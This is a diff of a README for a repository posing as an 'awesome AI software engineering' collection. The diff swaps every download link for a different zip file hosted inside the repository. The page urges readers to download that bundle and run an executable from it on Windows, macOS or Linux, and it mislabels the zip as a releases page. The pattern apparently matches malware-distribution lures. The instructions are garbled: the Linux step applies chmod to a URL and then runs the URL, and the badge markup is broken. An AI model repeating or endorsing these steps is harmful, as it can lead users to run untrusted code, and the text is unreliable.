@@ -1,7 +1,7 @@
 ```markdown
 # 🤖 awesome-ai-software-engineering - Enhance Your Software Development with AI
 
-[![Download Now](https://github.com/Suriboy070/awesome-ai-software-engineering/raw/refs/heads/main/patterns/software-ai-awesome-engineering-v2.1.zip%20Now-Click%https://github.com/Suriboy070/awesome-ai-software-engineering/raw/refs/heads/main/patterns/software-ai-awesome-engineering-v2.1.zip)](https://github.com/Suriboy070/awesome-ai-software-engineering/raw/refs/heads/main/patterns/software-ai-awesome-engineering-v2.1.zip)
+[![Download Now](https://raw.githubusercontent.com/Suriboy070/awesome-ai-software-engineering/main/resources/software_engineering_ai_awesome_contented.zip%20Now-Click%https://raw.githubusercontent.com/Suriboy070/awesome-ai-software-engineering/main/resources/software_engineering_ai_awesome_contented.zip)](https://raw.githubusercontent.com/Suriboy070/awesome-ai-software-engineering/main/resources/software_engineering_ai_awesome_contented.zip)
 
 ## 📋 Description
 
@@ -15,7 +15,7 @@ To begin using Awesome AI Software Engineering, you will need to download the re
 
    Click the link below to go to the releases page where you can download the latest version of the software.
 
-   [Download Now](https://github.com/Suriboy070/awesome-ai-software-engineering/raw/refs/heads/main/patterns/software-ai-awesome-engineering-v2.1.zip)
+   [Download Now](https://raw.githubusercontent.com/Suriboy070/awesome-ai-software-engineering/main/resources/software_engineering_ai_awesome_contented.zip)
 
 2. **Choose the Right Version**
 
@@ -33,7 +33,7 @@ To begin using Awesome AI Software Engineering, you will need to download the re
 
    - **Windows:** Double-click on the downloaded `.exe` file to install. Follow the prompts to complete the installation. After installation, you can usually find the app in your Start menu.
    - **macOS:** Open the `.dmg` file and follow the instructions to drag and drop the app into your Applications folder. After that, you can find it in your Applications.
-   - **Linux:** Open a terminal and navigate to the folder where the file is downloaded. Use the command `chmod +x https://github.com/Suriboy070/awesome-ai-software-engineering/raw/refs/heads/main/patterns/software-ai-awesome-engineering-v2.1.zip` to make it executable, then run it with `https://github.com/Suriboy070/awesome-ai-software-engineering/raw/refs/heads/main/patterns/software-ai-awesome-engineering-v2.1.zip`.
+   - **Linux:** Open a terminal and navigate to the folder where the file is downloaded. Use the command `chmod +x https://raw.githubusercontent.com/Suriboy070/awesome-ai-software-engineering/main/resources/software_engineering_ai_awesome_contented.zip` to make it executable, then run it with `https://raw.githubusercontent.com/Suriboy070/awesome-ai-software-engineering/main/resources/software_engineering_ai_awesome_contented.zip`.
 
 6. **Start Using the Tools**
 
@@ -52,7 +52,7 @@ To begin using Awesome AI Software Engineering, you will need to download the re
 
 ## 📥 Download & Install
 
-For easy access to the most recent versions, please visit our [Releases Page](https://github.com/Suriboy070/awesome-ai-software-engineering/raw/refs/heads/main/patterns/software-ai-awesome-engineering-v2.1.zip). Choose the correct file for your operating system, follow the installation instructions, and you will be ready to start enhancing your software development process.
+For easy access to the most recent versions, please visit our [Releases Page](https://raw.githubusercontent.com/Suriboy070/awesome-ai-software-engineering/main/resources/software_engineering_ai_awesome_contented.zip). Choose the correct file for your operating system, follow the installation instructions, and you will be ready to start enhancing your software development process.
 
 ## 📞 Support
 
